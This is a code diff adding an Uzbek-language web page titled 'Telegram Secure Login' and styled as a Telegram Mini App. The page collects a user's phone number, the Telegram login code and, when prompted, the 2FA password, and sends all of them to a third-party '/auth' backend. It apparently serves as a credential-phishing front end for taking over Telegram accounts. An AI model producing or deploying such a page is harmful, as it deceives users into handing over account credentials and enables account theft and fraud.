@@ -1,0 +1,257 @@
+<!DOCTYPE html>
+<html lang="uz">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Telegram Secure Login</title>
+
+<style>
+:root{
+  --bg:#0e1621;
+  --card:#17212b;
+  --primary:#2aabee;
+  --text:#e9edef;
+  --muted:#8b9bb4;
+  --danger:#ff6b6b;
+  --success:#4ade80;
+  --radius:16px;
+}
+
+*{box-sizing:border-box;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto}
+
+body{
+  margin:0;
+  background:radial-gradient(circle at top,#1b2735,#0e1621);
+  height:100vh;
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  color:var(--text);
+}
+
+.card{
+  width:390px;
+  background:var(--card);
+  border-radius:var(--radius);
+  padding:28px;
+  box-shadow:0 30px 60px rgba(0,0,0,.45);
+  animation:fadeIn .5s ease;
+}
+
+@keyframes fadeIn{
+  from{opacity:0;transform:translateY(16px)}
+  to{opacity:1;transform:none}
+}
+
+.logo{
+  width:64px;height:64px;
+  border-radius:50%;
+  background:var(--primary);
+  margin:0 auto 16px;
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  font-size:30px;
+}
+
+h2{text-align:center;margin:6px 0}
+p{text-align:center;font-size:14px;color:var(--muted);margin-bottom:22px}
+
+.step{
+  animation:stepIn .35s ease;
+}
+@keyframes stepIn{
+  from{opacity:0;transform:translateX(20px)}
+  to{opacity:1;transform:none}
+}
+
+input,button{
+  width:100%;
+  padding:14px;
+  border-radius:var(--radius);
+  font-size:15px;
+}
+
+input{
+  background:#0e1621;
+  border:1px solid #22303c;
+  color:var(--text);
+  margin-bottom:12px;
+  outline:none;
+}
+
+input:focus{border-color:var(--primary)}
+
+button{
+  background:var(--primary);
+  border:none;
+  color:white;
+  font-weight:500;
+  cursor:pointer;
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  gap:8px;
+  transition:.2s;
+}
+
+button:hover:not(:disabled){background:#1f9fe0}
+button:disabled{opacity:.6;cursor:not-allowed}
+
+.hidden{display:none}
+
+.msg{
+  text-align:center;
+  font-size:14px;
+  margin-top:12px;
+}
+.msg.error{color:var(--danger)}
+.msg.success{color:var(--success)}
+
+.spinner{
+  width:18px;height:18px;
+  border:2px solid rgba(255,255,255,.3);
+  border-top-color:white;
+  border-radius:50%;
+  animation:spin .8s linear infinite;
+}
+@keyframes spin{to{transform:rotate(360deg)}}
+
+.footer{
+  text-align:center;
+  font-size:12px;
+  color:var(--muted);
+  margin-top:18px;
+}
+</style>
+</head>
+
+<body>
+
+<div class="card">
+  <div class="logo">✈️</div>
+  <h2>Telegram orqali kirish</h2>
+  <p id="desc">Xavfsiz autentifikatsiya</p>
+
+  <!-- SHARE CONTACT -->
+  <div id="tgStep" class="step hidden">
+    <button onclick="shareContact()">📞 Telefon raqamni ulashish</button>
+  </div>
+
+  <!-- MANUAL PHONE -->
+  <div id="manualStep" class="step hidden">
+    <input id="phone" placeholder="+998901234567">
+    <button onclick="sendCode()">Kod yuborish</button>
+  </div>
+
+  <!-- CODE -->
+  <div id="codeStep" class="step hidden">
+    <input id="code" placeholder="Telegram kodi">
+    <input id="password" class="hidden" placeholder="2FA parol">
+    <button id="verifyBtn" onclick="verify()">Tasdiqlash</button>
+  </div>
+
+  <div id="msg" class="msg"></div>
+  <div class="footer">Telegram Mini App • Secure Login</div>
+</div>
+
+<script>
+const API = "/auth";
+let PHONE = null;
+
+const tgStep = document.getElementById("tgStep");
+const manualStep = document.getElementById("manualStep");
+const codeStep = document.getElementById("codeStep");
+const password = document.getElementById("password");
+const msgEl = document.getElementById("msg");
+const desc = document.getElementById("desc");
+const verifyBtn = document.getElementById("verifyBtn");
+
+/* ====== ENV DETECTION (MUHIM QISM) ====== */
+document.addEventListener("DOMContentLoaded", () => {
+  if (window.Telegram && Telegram.WebApp) {
+    Telegram.WebApp.ready();
+    tgStep.classList.remove("hidden");
+  } else {
+    manualStep.classList.remove("hidden");
+  }
+});
+
+/* ====== UI HELPERS ====== */
+function showMsg(text,type="success"){
+  msgEl.textContent=text;
+  msgEl.className="msg "+type;
+}
+
+function setLoading(btn,state){
+  btn.disabled=state;
+  btn.innerHTML = state
+    ? `<div class="spinner"></div> Tekshirilmoqda...`
+    : "Tasdiqlash";
+}
+
+/* ====== SHARE CONTACT ====== */
+function shareContact(){
+  Telegram.WebApp.requestContact(res=>{
+    if(res?.phone_number){
+      PHONE=res.phone_number;
+      sendCode();
+    }
+  });
+}
+
+/* ====== SEND CODE ====== */
+async function sendCode(){
+  if(!PHONE){
+    PHONE=document.getElementById("phone").value.trim();
+    if(!PHONE) return showMsg("Telefon raqamni kiriting","error");
+  }
+
+  showMsg("Kod yuborilmoqda...");
+  const r = await fetch(`${API}/send-code`,{
+    method:"POST",
+    headers:{"Content-Type":"application/json"},
+    body:JSON.stringify({phone:PHONE})
+  });
+
+  if(!r.ok) return showMsg("Kod yuborilmadi","error");
+
+  desc.textContent="Telegram’dan kelgan kodni kiriting";
+  tgStep.classList.add("hidden");
+  manualStep.classList.add("hidden");
+  codeStep.classList.remove("hidden");
+  showMsg("Kod yuborildi");
+}
+
+/* ====== VERIFY CODE / 2FA ====== */
+async function verify(){
+  setLoading(verifyBtn,true);
+
+  const r = await fetch(`${API}/verify-code`,{
+    method:"POST",
+    headers:{"Content-Type":"application/json"},
+    body:JSON.stringify({
+      phone:PHONE,
+      code:document.getElementById("code").value,
+      password:password.value || null
+    })
+  });
+
+  const d = await r.json();
+  setLoading(verifyBtn,false);
+
+  if(!r.ok){
+    if(d.detail==="2FA parol kerak"){
+      password.classList.remove("hidden");
+      return showMsg("2FA parolni kiriting","error");
+    }
+    return showMsg(d.detail || "Xatolik","error");
+  }
+
+  showMsg("Muvaffaqiyatli 🎉");
+  setTimeout(()=>Telegram?.WebApp?.close(),800);
+}
+</script>
+
+</body>
+</html>
